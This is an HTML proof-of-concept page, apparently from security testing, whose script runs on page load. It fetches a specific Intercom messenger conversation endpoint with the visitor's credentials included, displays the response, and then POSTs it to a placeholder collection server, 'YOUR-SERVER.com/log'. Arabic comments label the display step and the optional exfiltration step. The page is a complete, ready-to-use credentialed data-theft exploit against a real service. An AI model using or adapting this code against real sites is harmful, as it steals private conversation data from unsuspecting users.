<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC Test</title>
</head>

<body>
  <h2>Testing CORS...</h2>
  <pre id="output">Waiting...</pre>

  <script>
    async function exploit() {
      const output = document.getElementById("output");

      try {
        const response = await fetch(
          "https://api-iam.intercom.io/messenger/web/conversations/215474041396551",
          {
            method: "GET",
            credentials: "include"
          }
        );

        const data = await response.text();

        // عرض النتيجة
        output.textContent = data;

        // محاولة إرسال البيانات لسيرفر خارجي (اختياري)
        await fetch("https://YOUR-SERVER.com/log", {
          method: "POST",
          headers: {
            "Content-Type": "text/plain"
          },
          body: data
        });

      } catch (error) {
        output.textContent = "Error: " + error;
        console.error("CORS/Fetch error:", error);
      }
    }

    exploit();
  </script>
</body>
</html>
